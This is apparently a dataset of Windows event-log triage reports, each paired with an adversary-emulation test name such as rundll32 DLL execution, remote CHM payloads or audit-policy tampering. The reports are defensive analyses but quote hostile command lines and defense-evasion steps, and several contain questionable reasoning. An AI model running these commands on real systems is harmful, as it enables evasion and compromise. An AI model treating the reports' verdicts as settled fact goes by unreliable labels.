   - **Observation**: High activity related to `MicrosoftEdgeUpdate` processes, involving different commands and setups, evident from the sequence of process executions.
   - **Potential Implication**: While the `MicrosoftEdgeUpdate` behavior aligns with legitimate update processes, repeated and clustered execution might be worthy of attention to ensure no masking of malicious activity.
   - **Assessment**: Appears benign as regular update operation but should verify if this aligns with the expected update cycle or versioning.

4. **Network and User Context**:
   - **Observation**: Execution privileges seemed typical for an admin_test user, operating primarily within administrative context unless otherwise mentioned.
   - **Security Implication**: `High` integrity level associated with executions, including registry changes, suggest actions taken under administrative privileges.
   - **Assessment**: Administrative level access can make such changes typical; ensure activities performed are authorized and part of standard procedures.

### Conclusion and Recommendations:

- **Resolution**: **SUSPICIOUS**
  - While most activities seem routine or potentially explainable, the registry change and the context of its alteration are suspicious enough to warrant further investigation.
  - Recommended steps include verifying if this registry change aligns with policy or intended actions by authorized personnel and reviewing associated events for any irregular sequences or relationships.

"
Compiled HTML Help Remote Payload,"Upon reviewing the provided logs, I've identified some potentially suspicious activities that could indicate malicious behavior or compromise. Here are the main points of interest:

1. **Time Manipulation Events**: 
   - There appear to be two events related to system time changes (`EventID: 4616`) logged in quick succession. The time was set back by a few seconds. Adjusting system time can be a technique used by attackers to avoid generating alerts or logging errors. In this context, it might be used for evading time-based defenses.

2. **Logon and Privilege Escalation**:
   - The `admin_test` user had multiple logons with high privileges (`EventID: 4624`) and special privileges were assigned repeatedly (`EventID: 4672`). This involves privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc., which are often used beyond normal administrative tasks and can be indicative of privilege escalation or preparation for further system compromise.

3. **Command Execution**:
   - The Sysmon logs detail unusual command-line executions such as with the `cmd.exe` running `hh.exe` from a remote location (https://raw.githubusercontent.com/...). Downloading from external locations can be considered suspicious, especially when executed from sessions identified with system-level integrity.
   - `wevtutil.exe` is a legitimate tool used for event logs manipulation, and its repeated usage could indicate attempts to clear or modify logs to hide tracks.

4. **Execution of Tools and Scripts**:
   - There is consistent execution of system utilities like `hostname.exe`, `whoami.exe`, which may be used for reconnaissance within the system. Additionally, multiple PowerShell instances with the command to search for specific install matches are captured. PowerShell with `ExecutionPolicy Restricted` is generally not usual for administrative automated contexts but might be structured to hide script execution syntax anomalies.

5. **Network Connections**:
   - Events of successful remote logons using NTLM authentication (`EventID: 4624` with LogonType 3) from a workstation (DESKTOP-3HL5B2P) indicate successful network activity which warrants a review to confirm legitimacy.

6. **Task Scheduler Operations**:
   - Multiple executions of `taskhostw.exe` indicate potential use of a scheduled task, which could be leveraged as persistence by attackers.

### Summary and Recommendation:

**Resolution**: **SUSPICIOUS**

The logs exhibit signs of potential malicious activity that deserve further investigation to rule out any compromise:

1. **Investigate User Activities**:
   - Review the activities associated with the `admin_test` account, especially around network access and privilege usage.
   
2. **Scrutinize Executable Calls and Downloads**:
   - Investigate external command execution and downloading activities, specifically analyzing any file transfers or script operations during the timeframe of these logs.
   
3. **Time Manipulation**:
   - Verify if the time changes were legitimate administrative tasks or part of an attack to evade detection mechanisms.
   
4. **Network and Remote Access**:
   - Validate if the remote logins were authorized and recheck possible lateral movement or data exfiltration traces.

5. **Consult Security Tools**:
   - Run endpoint scanning or integrity checking tools and involve network monitoring for potential anomalies in communications initiated during outlined activities.

The activities detected are certainly suspicious and, until proven legitimate, should be treated as potential indicators of compromise (IoCs) with further domain scrutiny and audit across logs for unknown anomalies. Additionally, ensure all security patches are updated and review access control policies as a routine safeguard."
Rundll32 with Control_RunDLL,"Upon review of the provided Windows event logs from the Sysmon, Application, Security, System, and Windows PowerShell logs, here is a detailed assessment:

### Detailed Analysis

1. **Observation of Command Execution:**
   - **PowerShell Execution:**
     - There is an event logging the execution of PowerShell by the user `SERVER002\admin_test`, which is normal for an administrator task. However, typical investigative steps include understanding the specific command or script that was executed, but this information is not provided in the log.
   
   - **Suspicious Rundll32 Execution:**
     - A notable command execution involves `cmd.exe` executing `rundll32.exe` with the command line:
       ```
       ""cmd.exe"" /c rundll32.exe shell32.dll,Control_RunDLL ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\bin\\calc.dll""
       ```
     - `rundll32.exe` is often exploited by malware to execute malicious DLLs. The execution from a temporary directory with `calc.dll` suggests potential malicious activity, especially as `calc.dll` does not correspond to any known legitimate system function.

2. **Event Logs Correlation:**
   - The sequence of events shows a potentially unauthorized or suspicious command line that takes the processing path from `cmd.exe` to `rundll32.exe`. This escalation utilizing the temporary directory should be investigated further.

3. **Edge Update Activities:**
   - There are multiple events of Microsoft Edge Update activities. These log entries appear to relate to legitimate software updates and processes executed by `NT AUTHORITY\SYSTEM` and fall in line with expected behavior during software updates, indicative of benign system maintenance or updates. 

4. **Security and System Logs:**
   - Absence of evidence in Security and System logs may indicate either a restriction in log collection or lack of reported security-related incidents during this time.

5. **Windows PowerShell Logs:**
   - No additional information is provided, which limits insights into specific PowerShell actions.

### Assessment and Recommendations

Given the analysis above, the key points of concern revolve around the execution of `rundll32.exe` with a DLL from a temporary directory, suggesting possible malware activity. This behavior deviates from normal system operations and requires immediate attention.

- **Resolution:** **MALICIOUS**

### Recommendations

1. **Immediate Action:**
   - Conduct a thorough forensic investigation of the temporary directory and associated files, especially `calc.dll`, to determine its origin and contents.
   - Quarantine affected systems to prevent further potential spread.

2. **Further Investigation:**
   - Collect and analyze network traffic logs around the timeframe of suspicious events to verify any external communication attempts.
   - Review user activity logs for `SERVER002\admin_test` across other systems for similar behaviors.

3. **Preventive Measures:**
   - Implement robust logging for PowerShell and command-line executions across all critical systems.
   - Educate users about security hygiene and remind them to report any strange behavior.

Given these actions, ensure continuous monitoring and stay vigilant for further indicators of compromise."
Modify Internet Zone Protocol Defaults in Current User Registry - PowerShell,"**Analysis Report**

Based on the provided logs, there are a few observations which stand out:

1. **Application Log Analysis:**
   - The application logs indicated that the `edgeupdate` service was stopped twice in a short time frame. This alone does not typically suggest malicious activity, as it might be due to legitimate update processes stopping and starting services.

2. **System Log Analysis:**
   - Kernel general events and time service updates are shown, which are standard and typically occur during normal system activities like Windows time synchronization. No suspicious hostnames or unauthorized time changes were observed.

3. **Windows PowerShell Log Analysis:**
   - The logs indicated PowerShell was used to execute commands modifying registry settings related to the protocol defaults for HTTP and HTTPS to '0', which can be indicative of misconfiguration or potentially malicious activity aimed at bypassing browser security settings.
   - This could potentially redirect or disable safety features in certain browsing contexts, making it suspicious and worth deeper investigation.

4. **Sysmon Log Analysis:**
   - A significant portion of the logs consist of normal operations related to Edge updates executed by processes owned by `NT AUTHORITY\SYSTEM`, a typical context for system or maintenance updates.
   - However, the identity used for invoking updates, alongside processes such as `wsmprovhost.exe`, indicates legitimate Microsoft Edge updates. The SHA256 hashes associated with these processes do not immediately correspond to known malware but should be verified.
   - The repetitive running of `whoami.exe` and numerous instances of `conhost.exe` typically do not imply malicious activity, however, the frequency and context should be validated to ensure no misconfiguration or misbehavior by scripts.

5. **Security Log Analysis:**
   - Security logs feature normal event IDs (4616) concerning time change events, typical for NTP clients updating system time. They do not indicate any unauthorized access or suspicious actions from unknown users or services.

**Assessment:**

- **Suspicious Indicators:** The registry modification via PowerShell suggests a suspicious action. While the powershell command can be legitimate during certain administrative tasks, as a senior analyst, I must highlight the use of PowerShell to modify registry settings related to zone mapping for URLs as a potential security concern. 
- **Malicious Indicators:** There aren't clear indications of purely malicious activity. Most processes and activities can be associated with legitimate system updates and host operations.
- **Benign Indicators:** The majority of the log data appears routine and corresponds to known and legitimate activities like Edge updates and system service operations.

**Resolution: SUSPICIOUS**

Given the above analysis, the logs are marked as suspicious due to the PowerShell activity modifying Internet settings. This action needs deeper investigation to determine if these changes were authorized and necessary, or potentially part of a malicious script or configuration error. It is recommended to:
- Verify the purpose of the registry changes with system administrators.
- Review security policies to analyze if there has been a recent change in baseline configurations.
- Conduct further analysis to ensure there is no external influence or unauthorized scripts running on the system."
Disable Windows Lock Workstation Feature,"After a detailed analysis of the provided Windows event logs, here is the summarized assessment:

1. **Frequent Execution of `wevtutil.exe` and `conhost.exe`:**
   - The execution of `wevtutil.exe` in the logs could signify legitimate use or an attempt to manipulate or query event logs. Frequent execution in close proximity and pairing with `conhost.exe` can be considered suspicious if it deviates from regular usage or organizational policies. However, based on the information, there seems to be a pattern without any additional malicious indicators.

2. **Execution of `hostname.exe`, `whoami.exe` and `cmd.exe`:**
   - `hostname.exe` and `whoami.exe` are standard Windows utilities and their isolated execution isn't deemed inherently malicious. 
   - The use of `cmd.exe` to alter registry settings (`reg.exe` command) to disable workstation locking (`DisableLockWorkstation`) is considered suspicious. It indicates an attempt to prevent the locking of the workstation, possibly to maintain unauthorized access.

3. **Microsoft Edge Update Activities:**
   - The logs show a series of Microsoft Edge Update-related processes. These typically follow expected patterns for software updates and are running under `NT AUTHORITY\SYSTEM`, a high-privileged account. The presence of various legitimate processes and their logs seem consistent with an automatic or scheduled update.

4. **Analysis of Potential Malicious Behavior:**
   - The modifying registry key to disable workstation locking is a significant red flag. This activity is aligned with tactics used in post-exploitation scenarios to maintain persistence.
   - No direct evidence of privilege escalation or command execution attempting to gain higher privileges was found apart from the already high integrity level under which some processes were executed.

5. **Threats and Risks Identified:**
   - The command that modifies the registry to disable workstation locking is potentially dangerous. This could have been used by malware or threat actors to maintain access without interruptions.
   - Unattended unauthorized changes to the registry present security risks and may lead to further compromise.

6. **Guidance:**
   - Recommend immediate investigation and verification of accounts or entities initiating the registry change.
   - Usage of endpoint detection and response (EDR) tools to monitor for similar behavior in the future.
   - Consider auditing registry modifications and applying group policies to log or prevent unauthorized changes to critical registry paths.

**Resolution**: **SUSPICIOUS**

The activity logged for `cmd.exe` and `reg.exe` altering the registry is suspicious and requires further investigation to determine the intent and context. While the other activities regarding system processes and updates appear benign or standard operational tasks, the registry modification action stands out as potentially harmful."
Regasm Uninstall Method Call Test,"### Detailed Analysis of the Logs

#### Suspension Activities:
1. **Application Log Analysis:**
   - The Application log shows that the Edge Update service stopped multiple times within a very brief period but did not provide additional context or logs. This behavior could indicate either an automatic update process or an unusual, potentially malicious service disruption.

2. **Sysmon Log Analysis:**
   - The sequence of events shows extensive activity related to `MicrosoftEdgeUpdate.exe`. However, this is consistent with legitimate service behavior as Edge updates itself automatically.
   - Notable is the presence of temporary DLL and COM registration activities which suggest that the Edge Update is performing software updates and component registration, which aligns with normal functionality.
   - The compilation and registration activities (using `csc.exe`, `RegAsm.exe`) are particularly concerning when rooted in the Temp directory. This activity resembles a behavior sometimes associated with code injection or malware persistence.  
   - PowerShell is seen followed by `whoami.exe`, `hostname.exe`, and `cmd.exe` executions, possibly indicating reconnaissance behavior, especially if not common for standard user operations.

3. **Indicators of Potential Misuse:**
   - Use of .NET objects `csc.exe` and `RegAsm.exe` in a temp path (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.009\src\data.009.cs`) is problematic. If this was unexpected in the environment, it might point to a script-based attack.
   - Specific command executions under `admin_test` user suggest this might be run by or under a privileged account, raising the potential of a privileged user account being leveraged for the unauthorized activity.

#### Overall Assessment:
- **Risks and Threat Identification:**
  - The combination of temporary directory compilation, PowerShell execution, and unusual file registration is more indicative of a suspicious behavior pattern rather than outright malicious known pattern.
  - Given these scripted and compiled activities could either be legitimate administrative scripts or unauthorized executions, deeper verification of these scripts' intended functionalities is intrigued for congruity with system operations.
 
#### Guidance on How to Proceed:
- **Review Administrative Scripts/Tasks:**
  - Check if the use of `csc.exe` and related activities correspond with legitimate scripts or tasks associated with administrative processes or custom software deployment in use by the organization.
- **Conduct User Activity Review:**
  - Verify `admin_test` activities and assess the context of these PowerShell and other command-line activities for legitimacy, especially regarding their timestamps relative to known maintenance tasks.
  
- **Network Monitoring:**
  - Implement network monitoring focusing on the user and endpoint identified as `admin_test` for any unusual activities post these observations.
  
- **Consider Threat Hunting:**
  - Leverage endpoint detection and response (EDR) tools to search for similar patterns on other systems within the network, indicating wider spread.

### Final Conclusion:
The behavior observed in the provided logs will fall under **SUSPICIOUS**. While it doesn't definitively indicate a known malicious compromise, this requires more investigation to ensure legitimacy or unmask a potential threat."
Disable Windows Task Manager application,"Based on the provided Windows event logs, the following analysis is detailed below:

### Application Log:
- The logs show normal operations such as the stopping of the ""edgeupdate"" service, which is responsible for updating Microsoft Edge. There is no indication of abnormal behavior.

### Security Log:
- The logs indicate a time change event (EventID 4616) for ""svchost.exe"" running under ""LOCAL SERVICE"". While frequent time changes could be anomalous, this alone in a single instance without context (e.g., timezone changes, daylight saving adjustments) generally doesn't immediately imply malicious activity.

### Sysmon Log:
- There are multiple processes initiated by ""SERVER002\admin_test"", which is an admin account. These include typical utility binaries like `hostname.exe`, `whoami.exe`, `cmd.exe`, and `reg.exe`. The commands executed (`reg add ""DisableTaskmgr""`) imply an intention to disable Task Manager. While legitimate use cases exist for this operation (e.g., certain corporate environments), it's often associated with efforts to limit system monitoring, which could be a tactic of malware.
- Notably, several executions of `wevtutil.exe` and `conhost.exe` seemed regular, correlating with standard process activity.

### System Log:
- Time synchronization adjustments were logged which correlate with typical operations when a system syncs with NTP (Network Time Protocol) servers, without any immediate sign of tampering.

### Suspicious Activity:
- Use of `cmd.exe` to modify the registry (`reg add ... DisableTaskmgr`) especially under an admin account (`SERVER002\admin_test`) is suspicious, as it seeks to disable Task Manager. This action might be indicative of attempts to hinder user monitoring capabilities or prepare an environment for malicious activity.
- The sequence involving `whoami.exe`, `conhost.exe`, and registry modifications suggests possibly automated tasks or scripts running potentially unintended actions.

### Assessment:
Based on the registry modification through command line tasks and the account involved, there's an indication of suspicious behavior, though not definitively malicious without further corroborative evidence or context (such as analysis of system changes following these events, unusual network activity, or if these align with reported incidents).

### Resolution:
**SUSPICIOUS** - The log entries reveal activities that aren't immediately conclusive of malicious intent but are potentially concerning and warrant further investigation, particularly around processes executed by the `admin_test` account and registry changes disabling Task Manager. 

### Guidance:
1. **Investigate User Account `admin_test`**: Determine if the changes made align with routine user activity or if the account credentials have been compromised.
2. **Correlate with Additional Data**: Cross-reference these logs with any antivirus alerts, network logs, or other monitoring tools.
3. **Review Recent Changes**: Check for recent changes or newly installed software/hardware that may explain the registry modification.
4. **Implement Monitoring**: Increase monitoring on systems showing similar activities to detect patterns indicative of automated scripts or potential attacks."
Do Not Connect To Win Update,"Upon analyzing the provided Windows event logs, the following points summarize the detailed analysis:

### System Log Analysis
- **Event ID 24 and 1**: These Kernel-General events signify a change in the system time, triggered by the `svchost.exe` process. The time adjustments noted are small and conducted by the System service, which is typically benign.
- **Event ID 35**: The Time Service event noting the time source as `time.windows.com` indicates standard time synchronization with a known NTP server.

### Sysmon Log Analysis
- **Regular Execution of System Utilities**:
  - **Commands Executed**: `whoami.exe`, `conhost.exe`, `wevtutil.exe`, `cmd.exe`, `reg.exe`, `svchost.exe`, `sppsvc.exe`.
  - The execution of `whoami.exe`, `hostname.exe`, and `wevtutil.exe` is normal behavior for system diagnostics or script execution.
  
- **Command Execution**:
  - **cmd.exe and reg.exe**: A command run with `cmd.exe` modifies Windows Update settings in the registry (`DoNotConnectToWindowsUpdateInternetLocations`). This could be part of a legitimate script or policy deployment, but merits review in the context of the organization's policies.

### Security Log Analysis
- **Event ID 4616**: Reflects time adjustments, corresponding with the kernel-general logs. This event is consistent with valid system processes managing time synchronization.

### Application Log Analysis
- **Security-SPP Event ID 16384**: Indicates the Software Protection Platform was interacting with rules, a normal activity related to verifying software licensing.

### Noteworthy Observations
- **Regular Administrative Commands**: Commands like `whoami` and interactions with `HOSTNAME.EXE` and `wsmprovhost.exe` are typically legitimate during administrative tasks.
- **Registry Modification via cmd.exe**: While altering Windows update relates to administrative tasks, it should be validated if this corresponds to a sanctioned activity within your network.

### Assessment and Resolution
Based on the log entries:

- **No Direct Indicators of Malicious Activity**: The logs show consistent execution of Windows binaries and expected services (e.g., `svchost`, `conhost`).
- **Potentially Suspicious Activity**: Registry modification activities need further verification to ensure they comply with internal policy. While they are not direct indicators of compromise, they indicate a deviation from typical system behavior.

### Final Resolution
- **Resolution**: **SUSPICIOUS**
  - **Reason**: The registry modification needs to be questioned further and cross-referenced with authorized activity records to ensure they align with legitimate administrative processes. Further investigation with context to policy changes or scheduled administrative tasks is recommended.

As a next step, reviewing corresponding logs for user actions and network connections around the same time frame could provide additional context for potential anomalies."
File Extension Masquerading,"Upon analyzing the provided event logs, several suspicious activities were identified, indicating potential malicious behavior:

1. **PowerShell Execution from Temp Directory**: 
   - Multiple instances of PowerShell were executed from the `C:\Users\ADMIN_~1\AppData\Local\Temp\` directory with script files masquerading as document formats (e.g., `data.003_masquerading.doc.ps1`, `data.003_masquerading.pdf.ps1`, `data.003_masquerading.rtf.ps1`). This habitually signals an attempt to obfuscate malicious activity as legitimate document processing.
   
2. **Excessive Process Creation and Use of System Utilities**:
   - Various system utilities such as `whoami.exe`, `cmd.exe`, and `wevtutil.exe` were executed. These utilities are often used by attackers to gather system information, bypass defenses, or clear logs, which are common steps in post-compromise exploitation.

3. **Command Line Activity in Cmd.exe**:
   - The command line for `cmd.exe` in process creation includes copying system executables to paths indicative of disguise or masquerade, using various document extensions such as `.docx`, `.pdf`, `.xls`, as well as script files such as `.vbs`. This is a tactic often used to evade detection.

4. **Process Execution with System-Level Access**:
   - Several processes initiated by `NT AUTHORITY\SYSTEM` show the creation of masqueraded executables and processes, further indicating that higher privileges were exploited.

5. **Presence of Known Malicious Patterns**:
   - The creation and execution of `.vbs` files and the use of `wscript.exe` from temporary folders is a classic hallmark of malware.

Considering the detailed analysis and observed behaviors, the event logs indicate a coordinated compromise that likely included execution of malicious scripts, potential privilege escalation, and use of legitimate utilities for obfuscation or lateral movement. 

**Assessment and Resolution**:  
- **Resolution**: MALICIOUS  
- **Threat Assessment**: The logs reveal clear indicators of a compromise—evidence of script execution from temporary directories, process masquerading, and chaining of legitimate binaries for potentially malicious purposes.
- **Guidance**: 
  - Isolate the affected system (Server002) immediately to prevent further spread.
  - Conduct a thorough investigation to identify the source and scope of the breach.
  - Deploy security tools to scan the environment for indicators of compromise.
  - Review and update security policies to restrict execution of scripts from untrusted locations without verification."
Register Portable Virtualbox,"**Detailed Analysis of the Logs**

Upon reviewing the provided Windows event logs, several indicators suggest potentially suspicious activity requiring further investigation:

1. **PowerShell Activity:**
   - There is a logged PowerShell command that creates directories and downloads a file from GitHub, specifically ""common.cab"". Unauthorized script execution or downloading from external sources can be a potential indicator of malicious intent.
   - The command was executed with a non-admin account 'admin_test', but given the directory manipulation and download from an external repository, it needs review.

2. **Service and DLL Registration:**
   - A Windows Command Processor command was observed, involving the registration of a DLL file and the creation of a service `VBoxDRV`. While VirtualBox-related services aren't inherently malicious, such operations might be leveraged to execute or install unauthorized services.

3. **Privilege Escalation:**
   - Event ID 4672 indicates the assignment of special privileges like `SeDebugPrivilege` to the SYSTEM account. While SYSTEM accounts inherently have high privileges, the monitoring of such privilege assignments is crucial.
 
4. **Network Activity:**
   - The `msiexec.exe` execution is noted, which is typically involved in the installation processes. The lack of detailed command-line arguments or context about associated packages installs raises suspicion. Additionally, it was initiated by the SYSTEM account, a common tactic employed by malicious installers.

5. **Unusual File & Service Activities:**
   - Processes involving the RUXIM and other VirtualBox-related activities are noted. Although legitimate applications may trigger these, a pattern of excessive or concurrent execution can be suspicious.

6. **Security Audits:**
   - Numerous Event Log entries contain Event ID 5379 regarding failed credential operations with status `3221226021`. While failed authentication attempts on their own are not definitively malicious, they could suggest password spray attacks or misconfigured systems.

**Assessment**

The activities logged, such as unauthorized PowerShell commands, DLL registrations, and unusual service operations under SYSTEM or other privileged accounts, could be indicative of potential system compromise or misuse.

**Resolution: SUSPICIOUS**

The current evidence in the logs suggests behavior that is questionable but not definitively malicious. Further scrutiny is recommended, particularly by:
- Analyzing the entire command executed via PowerShell and its intended purposes.
- Checking for any unauthorized installation of software or services, especially related to VirtualBox.
- Confirming access logs around the time these events occurred to identify unusual access patterns.

**Guidance on How to Proceed**

- **Immediate Steps:**
  - Block any unauthorized external communications to suspect URLs or IPs.
  - Examine the hashes of downloaded files and executables against known databases for malicious files.
  - Isolate the system if necessary pending a deeper investigation.

- **Investigation:**
  - Capture and analyze network traffic, particularly following the PowerShell activity.
  - Review user account activities and privileges, especially for the 'admin_test' and SYSTEM accounts.
 
- **Preventative Actions:**
  - Strengthen security measures like application whitelisting, network security controls, and additional monitoring on PowerShell execution.
  - Educate users on security best practices, especially those with elevated privileges.

This information should guide further inquiry and response to ensure system security and integrity."
Impair Windows Audit Log Policy,"The logs provided include entries from the Application, Sysmon, System, and Security logs on a Windows host. Let's analyze them for any suspicious or anomalous behavior:

### Application and Sysmon Logs:
1. **Repeated execution of `wevtutil.exe` and `conhost.exe` by `admin_test`:**
   - `wevtutil.exe` is a legitimate command-line utility for managing event logs. However, repeated and automated executions in quick succession may indicate possible tampering with logs. This could be part of a cleanup operation by an attacker after achieving certain objectives.
   - `conhost.exe` is responsible for running command prompt within the GUI. Its repeated execution alongside `wevtutil.exe` could be benign or a part of standard operations if it matches typical behavior for `admin_test`. If unexpected, this could hint at an external script or command being executed frequently.

2. **Execution of `cmd.exe` with suspicious command-line arguments:**
   - The `cmd.exe` process used the `auditpol` command to disable success and failure auditing for various categories. Disabling auditing is a common tactic employed by attackers to evade detection. This activity was carried out by the `admin_test` user with high integrity, suggesting potential misuse of administrative privileges.

3. **Execution of `auditpol.exe`:**
   - Following the suspicious `cmd.exe` execution, `auditpol.exe` was used multiple times to adjust audit policies, confirming the intention to tamper with the audit settings.

4. **Execution of utilities like `whoami.exe` and `hostname.exe`:**
   - The `whoami.exe` and `hostname.exe` processes executed by `admin_test` appear standard for a user checking their identity and system information. These actions are generally benign unless tied with other malicious indicators.

### System and Security Logs:
1. **Time change events:**
   - There are system time changes recorded in the log. Although the time source was `time.windows.com`, these changes can be concerning if they coincide with suspicious activities, given that time alterations can be used to manipulate time-based logs or timestamps.

2. **Security log entries (4719 - Audit Policy Change):**
   - Multiple entries showing audit policy changes made by the `admin_test` user. These correlate with previously mentioned `auditpol` activities and suggest audit logs being disabled.
   
3. **Events (4616 - System Time Change):**
   - The security logs also indicate system time adjustments, matching what we observed in the system logs. While authorized by `LOCAL SERVICE`, these events can sometimes be exploited in specific attack scenarios.

### Assessment and Resolution:
The combination of disabling audit policies, frequent use of `wevtutil.exe` and `conhost.exe`, and system time changes raises significant concerns about the integrity and security of this Windows host. The actions related to auditing, in particular, are indicative of an attempt to obscure activities or avoid detection.

Considering these points, the logs contain signs of malicious activity or compromise. Therefore, the resolution based on the logs is:

**MALICIOUS**

### Guidance:
- **Immediate Actions:**
  - Initiate a detailed forensic investigation to determine the full extent of the compromise.
  - Consider isolating the system `Server002` from the network to prevent further damage or information exfiltration.
  - Review user account activity, especially `admin_test`, for unauthorized access or privilege escalation.

- **Long-term Actions:**
  - Revise access controls and audit policies to prevent unauthorized changes.
  - Implement continuous monitoring and an intrusion detection mechanism to catch similar activities proactively.
  - Reevaluate time synchronization settings and security logging infrastructure to handle discrepancies effectively."
Delete an entire folder - Windows cmd,"### Detailed Analysis of the Logs

#### 1. Overview of Events
The Windows event logs provided consist of only Sysmon logs. There are no entries available in the System log, Security log, or Windows PowerShell log, and a single entry in the Application log pertaining to the Software Protection Platform.

#### 2. Sysmon Logs Review
The Sysmon logs show a sequence of process creations and terminations. Let's look into each key aspect of these logs:

- **Whoami and Hostname Executions**:
    - Multiple instances of ""whoami.exe"" and ""hostname.exe"" are noted. These are standard Windows utilities used to gather system information and verify identity. It's not uncommon for administrative scripts to use these utilities as part of regular operations.
  
- **Cmd.exe Activity**:
    - Multiple ""cmd.exe"" executions with command-line arguments working with temporary directories are logged. These include:
      - **Creating** and **Deleting** directories in the `%temp%` location.
      - Checking for the existence of specific directories.

    - The command lines include activities like checking for existence (`IF EXIST`) and creation (`mkdir`) or removal (`rmdir`) of folders. These operations seem to be related to some maintenance or validation scripts and don't involve any suspicious paths or filenames.

- **Wevtutil Executions**:
    - The logs list several instances of ""wevtutil.exe"", a utility used for managing Windows Event logs. This could indicate potentially suspicious activity if logs are being modified or erased to cover tracks. However, there are no clear indications from the command-line arguments that log deletion or harmful actions are taking place.

- **svchost.exe and Other System Processes**:
    - Execution of processes like ""svchost.exe"", ""sppsvc.exe"", ""WmiPrvSE.exe"", and ""TrustedInstaller.exe"" are seen. These are standard system processes and appear to be functioning under typical system authorizations (`NT AUTHORITY`), which suggests legitimate system activities.

#### 3. Application Log Entry
An unrelated entry from the Software Protection Platform Service is present, indicating a routine operation related to software licensing or rule verification by the operating system.

### Assessment

After reviewing the detailed logs provided, the observed behaviors suggest routine administrative tasks. There are no clear indicators of privilege escalation, unusual command line arguments synonymous with attackers, or any malicious file paths or executables that typically raise red flags.

### Final Resolution
**BENIGN** - The activities logged appear to be consistent with legitimate administrative operations and system maintenance tasks. There is no compelling evidence within the scope of the provided logs to indicate malicious behavior or compromise at this time.

### Guidance on How to Proceed
- **Monitor**: Continue monitoring for any unusual patterns of activity, especially if similar processes are automated or scheduled. Be on alert for any changes from routine behavior.
- **Verify**: Double-check any related scheduled tasks or scripts to confirm they are intended operations by trusted personnel.
- **Educate**: Ensure that the administrative staff is aware of normal operating procedures and potential signs of compromises to help in early detection should circumstances change."
Lolbin Jsc.exe compile javascript to dll,"### Analysis of the Logs

Upon reviewing the provided logs across various categories (System, Security, Application, and Sysmon), I have identified several activities that warrant further discussion for potential security implications.

1. **Security Log:**
   - **Event ID 4624 (Successful Logon):** Repeated logon events with LogonType 5 indicate service logins. This is typical for system operations and services.
   - **Event ID 4672 (Special Privileges Assigned):** SYSTEM user is expected to have high privileges. However, it’s important to ensure that these privileges are not misused or escalate privilege attacks.
   - **Event ID 4798 (Query for Group Membership):** The taskhostw.exe querying group memberships could be a routine check for user credentials in a secure network/software update. But, repeated and continuous querying can suggest credential harvesting attempts.
   - **Event ID 5379 (Credential Manager Credentials):** Multiple unsuccessful credential read attempts with ReturnCode 3221226021 indicate failed operations, which might suggest unauthorized attempts to access credential information. However, this isn't conclusive evidence of malicious activity without further context.

2. **Sysmon Log:**
   - **Process Execution:** PowerShell and command-line utilities like cmd.exe executing scripts and commands are common in benign administrative or system maintenance tasks. The execution of PowerShell, wevtutil.exe, and cmd.exe does raise suspicion, especially since there's a cmd.exe with a command involving copy and compile actions using jsc.exe, potentially indicative of suspicious behavior.
   - **Events Around Edge Setup:** Execution of Edge updater setup.exe processes suggests software updates which are generally benign. However, it's important to ensure these are legitimate updates and not masquerading malicious files.
   - **Various System Processes:** Several system processes (e.g., MusNotification.exe, CompatTelRunner.exe, svchost.exe) are running which typically indicates normal Windows activity.

3. **Application Log:**
   - The entries for Windows Defender indicate it is operational, which is a healthy sign for the system's security stance.

### Assessment of the Situation

Based on the observed logs, here are some assessments:

- **Credential Access Attempts (Event ID 5379):** The pattern of failed credential access is slightly concerning but not definitive of a breach. This pattern might suggest an entity trying to access credential manager data which failed due to lack of permission or incorrect credentials.
- **Tasks & Privilege Events:** The querying of group memberships and high-level privileges of SYSTEM can be benign; however, any deviation from expected use should be further monitored.
- **Automation and Script Running:** The execution of scripts and commands can be part of legitimate system operations or software development lifecycle tasks, but they can also be malicious if not vetted correctly.

### Resolution and Guidance

Given our analysis of the log data:

- **Resolution:** **SUSPICIOUS**
- **Guidance:**
  1. **Monitor for Abnormal Behavior:** Ensure continuous monitoring of service accounts and credential access events, especially focusing on failed attempts and unusual patterns.
  2. **Verify Scripts and Binaries:** For the executed scripts and binaries observed, ensure they are sourced from trusted locations and validate their purpose within the organization.
  3. **Audit Permissions:** Regularly audit permissions for accounts obtaining special privileges, ensuring they align with expected roles.
  4. **Review System Updates:** Confirm that all software updates, especially from Edge, are indeed legitimate and authorized.
  5. **Implement Additional Logging:** Enable more detailed logging where possible to capture more context about questionable actions, particularly any external connections these applications may attempt to make.

This analysis should be communicated with relevant IT and security personnel to validate findings and adjust security posture as necessary. Further investigation may be required to fully ascertain the nature of the logged events."
Windows Auto Update Option to Notify before download,"Upon reviewing the provided Windows event logs, several entries stand out as potentially suspicious or indicative of uncommon activities that require further investigation:

1. **Security Log:**
   - **EventID 4616:** There are two back-to-back entries indicating that the system time was changed by the ""LOCAL SERVICE"" account using `svchost.exe`. The time change seems minor but should be checked if legitimate activity.
   - **EventID 4672 & 4624:** The user ""admin_test"" was granted a series of high-level privileges including `SeDebugPrivilege`, `SeLoadDriverPrivilege`, etc., which are powerful system privileges that could potentially be used for malicious purposes. The logon was performed using NTLM authentication from a workstation `DESKTOP-3HL5B2P`.

2. **Sysmon Log:**
   - **Process Creation & Execution:** The frequent use of `wevtutil.exe`, `conhost.exe`, `cmd.exe`, and registry modification commands by the user ""admin_test"" immediately after gaining elevated privileges raises concerns. Particularly, the command `cmd.exe /c reg add ...` to modify Windows Update settings implies possible system configuration changes that should have a legitimate business reason.
   - **Suspicious Use of `whoami.exe` and `HOSTNAME.EXE`:** These executions might be used to gather system information. Although legitimate in many contexts, their usage patterns here should be interpreted cautiously, especially post-privilege escalation.

3. **Application and System Logs:**
   - **Edge Update Processes:** There are multiple entries related to Microsoft Edge Update processes being executed under the SYSTEM account. This is fairly standard for updates but reviewing the update configuration is prudent if unexpected behavior persists.

4. **Anomaly Observations:**
   - The sequence of events, such as creation of new user sessions with high privileges, potential unauthorized changes to system configurations, and communication with network services, suggests processes that might indicate preparation or execution of malicious activities.

**Assessment Summary:**
- **Threats/Risks Identified:** The alteration of system configurations, specifically with elevated privileges, should be scrutinized for unauthorized changes potentially affecting system security or stability.
- **Next Steps/Guidance:**
  - **Confirm Legitimate System Changes:** Verify with system administrators whether the time changes and registry modifications were part of scheduled maintenance or updates.
  - **User Verification:** Ensure the account ""admin_test"" was used with proper authorization, and investigate the origin of the NTLM logon.
